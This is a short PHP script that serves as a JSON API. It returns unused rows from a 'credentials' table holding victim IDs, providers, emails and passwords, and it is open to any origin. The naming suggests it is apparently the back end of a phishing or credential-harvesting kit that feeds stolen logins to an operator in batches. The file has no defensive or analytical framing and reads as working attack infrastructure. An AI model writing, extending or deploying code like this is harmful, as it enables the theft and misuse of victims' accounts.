<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

define('DB_FILE', '../storage/box26.db');

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $last_id = $_GET['last'] ?? 0;
    
    $stmt = $db->prepare("SELECT id, victim_id, provider, email, password FROM credentials WHERE used = 0 AND id > ? ORDER BY id ASC LIMIT 10");
    $stmt->execute([$last_id]);
    
    echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
} catch (Exception $e) {
    echo json_encode([]);
}
?>
